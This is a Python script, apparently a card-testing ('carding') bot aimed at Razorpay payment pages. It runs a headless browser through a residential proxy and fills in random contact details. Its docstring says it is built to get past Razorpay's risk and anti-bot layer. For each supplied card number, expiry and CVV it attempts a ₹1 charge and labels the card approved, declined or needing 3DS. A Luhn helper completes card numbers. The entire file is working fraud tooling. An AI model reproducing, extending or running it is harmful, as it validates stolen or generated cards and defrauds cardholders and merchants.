"""Full browser walker for Razorpay payment pages — beats the shield/risk layer.

Runs a real chromium through the resi proxy and performs the entire payment like
a human: amount → Pay → contact → Cards → card form → Pay → verdict. The
checkout.js bundle runs natively, so the shield payload, sardine fingerprint and
cookies are all genuine — no WAF 403.

Usage: python3 pay.py '<json>'
  json: {"site": "https://razorpay.me/@x", "card": "4111...", "mm": "12",
         "yy": "2029", "cvv": "123", "proxy_server": "...", "proxy_user": ..., "proxy_pass": ...}
Output on stdout: {"status": "...", "response": "...", "site": "...", "raw": "..."}
  status: APPROVED | DECLINED | REQUIRES_ACTION | SITE_FAIL | ERROR
"""
import sys, json, time, random


def luhn_complete(num):
    digits = [int(d) for d in num]
    odd = len(digits) % 2 == 1
    s = 0
    for i, d in enumerate(digits):
        if i % 2 == (0 if odd else 1):
            d *= 2
            if d > 9:
                d -= 9
        s += d
    return num + str((10 - s % 10) % 10)


def out(obj):
    print(json.dumps(obj))
    sys.stdout.flush()
    sys.exit(0)


def main():
    args = json.loads(sys.argv[1])
    site = args["site"]
    card = args["card"]
    mm = args["mm"]
    yy = args["yy"]
    cvv = args["cvv"]
    phone = args.get("phone") or str(random.randint(6000000000, 9999999999))
    email = args.get("email") or f"walker{random.randint(100,999)}.rbx@gmail.com"
    name = args.get("name") or "John Walker"

    result = {"status": "ERROR", "response": "unknown", "site": site, "raw": ""}

    from playwright.sync_api import sync_playwright

    with sync_playwright() as p:
        proxy = {"server": args["proxy_server"]}
        if args.get("proxy_user"):
            proxy["username"] = args["proxy_user"]
            proxy["password"] = args.get("proxy_pass", "")
        b = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"], proxy=proxy)
        pg = b.new_page(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                                    "Chrome/131.0.0.0 Safari/537.36")

        api_hits = []

        def on_resp(r):
            u = r.url
            if "api.razorpay.com" in u and ("checkout/order" in u or "payments/" in u or "payment_pages" in u):
                try:
                    body = r.text()
                except Exception:
                    return
                api_hits.append({"status": r.status, "url": u, "body": body[:4000]})

        pg.on("response", on_resp)

        try:
            pg.goto(site, timeout=60000, wait_until="domcontentloaded")
            pg.wait_for_timeout(5000)
            amt = pg.query_selector("input[type=number]")
            pay_btn = pg.query_selector("input[type=button]")
            if not amt or not pay_btn:
                out({"status": "SITE_FAIL", "response": "not a payment page", "site": site, "raw": ""})
            amt.fill("1")
            pay_btn.click()
            pg.wait_for_timeout(10000)

            cf = None
            for _ in range(6):
                cf = next((f for f in pg.frames if "api.razorpay.com" in f.url and "checkout" in f.url), None)
                if cf:
                    try:
                        cf.wait_for_selector("input[name=contact], input[type=radio], input[name='card.number']", timeout=5000)
                        break
                    except Exception:
                        cf = None
                pg.wait_for_timeout(3000)
            if not cf:
                out({"status": "SITE_FAIL", "response": "checkout did not open", "site": site, "raw": ""})

            # contact step
            if cf.query_selector("input[name=contact]"):
                cf.fill("input[name=contact]", phone)
                try:
                    cf.fill("input[name=email]", email)
                except Exception:
                    pass
                try:
                    cf.click("button:has-text('Continue')", timeout=5000)
                except Exception:
                    cf.evaluate("""() => { for (const bt of document.querySelectorAll('button')) if ((bt.textContent||'').includes('Continue')) { bt.click(); break; } }""")
                pg.wait_for_timeout(7000)

            # card method
            cf.evaluate("""() => { for (const r of document.querySelectorAll('input[type=radio]')) { const lab = r.closest('label,div')?.textContent || ''; if (/card/i.test(lab)) { r.click(); break; } } }""")
            pg.wait_for_timeout(5000)

            card_input = None
            for sel in ("input[name='card.number']", "input[name='card[number]']"):
                try:
                    cf.wait_for_selector(sel, timeout=6000)
                    card_input = cf.query_selector(sel)
                    if card_input:
                        num_sel, exp_sel, cvv_sel = sel.replace("number", "number"), None, None
                        if "card.number" in sel:
                            exp_sel, cvv_sel = "input[name='card.expiry']", "input[name='card.cvv']"
                        else:
                            exp_sel, cvv_sel = "input[name='card[expiry]']", "input[name='card[cvv]']"
                        break
                except Exception:
                    continue
            if not card_input:
                out({"status": "SITE_FAIL", "response": "card form did not render", "site": site, "raw": ""})

            cf.fill(num_sel, card)
            exp_val = f"{mm}/{yy[-2:]}"
            try:
                cf.fill(exp_sel, exp_val)
            except Exception:
                cf.type(exp_sel, exp_val, delay=60)
            try:
                cf.fill(cvv_sel, cvv)
            except Exception:
                cf.type(cvv_sel, cvv, delay=60)
            pg.wait_for_timeout(1500)

            verdict = None
            for attempt in range(3):
                before = len(api_hits)
                try:
                    clicked = cf.evaluate("""() => {
                        const btns = [...document.querySelectorAll('button')].filter(b => b.offsetParent && !b.disabled);
                        for (const bt of btns) { const t=(bt.textContent||'').trim(); if (/pay/i.test(t)) { bt.click(); return 'pay'; } }
                        const subs = btns.filter(b => b.type==='submit' && !(b.textContent||'').trim());
                        if (subs.length) { subs[subs.length-1].click(); return 'submit'; }
                        return 'nopay';
                    }""")
                except Exception:
                    clicked = "detached"
                pg.wait_for_timeout(12000)

                new_hits = api_hits[before:]
                # find the checkout/order POST verdict
                for h in reversed(new_hits):
                    try:
                        j = json.loads(h["body"][:h["body"].index("}", 0) + 1]) if False else json.loads(h["body"]) if h["body"].strip().startswith("{") else None
                    except Exception:
                        j = None
                    if not isinstance(j, dict):
                        continue
                    err = j.get("error")
                    if isinstance(err, dict):
                        desc = err.get("description", "")
                        if "trouble completing" in desc.lower():
                            continue  # server 500 — retry
                        verdict = {"status": "DECLINED", "response": desc or err.get("reason", "Payment failed"), "raw": h["body"][:1500]}
                        break
                    st = str(j.get("status", "")).lower()
                    if st in ("captured", "authorized", "paid"):
                        verdict = {"status": "APPROVED", "response": "Charged ₹1.00 (Success)", "raw": h["body"][:1500]}
                        break
                    if "next" in j or j.get("redirect") or "authenticate" in json.dumps(j).lower():
                        verdict = {"status": "REQUIRES_ACTION", "response": "3DS/OTP Requires Action", "raw": h["body"][:1500]}
                        break
                    pid = j.get("payment_id") or j.get("id")
                    if pid and st:
                        verdict = {"status": "DECLINED", "response": f"Payment {st}", "raw": h["body"][:1500]}
                        break
                if verdict:
                    break

            if not verdict:
                # fall back to visible widget text
                try:
                    texts = cf.evaluate("""() => {
                        const out = [];
                        for (const e of document.querySelectorAll('div,span,p')) {
                            const t = (e.textContent||'').trim();
                            if (!t || t.length > 200 || !e.offsetParent) continue;
                            const l = t.toLowerCase();
                            if (l.includes('declin')||l.includes('failed')||l.includes('incorrect')||l.includes('invalid')||l.includes('insufficient')||l.includes('otp')||l.includes('authenticat')||l.includes('success'))
                                out.push(t.slice(0,150));
                        }
                        return [...new Set(out)];
                    }""")
                except Exception:
                    texts = []
                if texts:
                    verdict = {"status": "DECLINED", "response": texts[0], "raw": json.dumps(texts)[:1500]}
                else:
                    verdict = {"status": "SITE_FAIL", "response": "no verdict captured", "raw": json.dumps(api_hits[-3:])[:1500] if api_hits else ""}

            out({"status": verdict["status"], "response": verdict["response"], "site": site, "raw": verdict["raw"]})

        except Exception as e:
            out({"status": "ERROR", "response": f"{type(e).__name__}: {str(e)[:120]}", "site": site, "raw": ""})
        finally:
            try:
                b.close()
            except Exception:
                pass


if __name__ == "__main__":
    main()
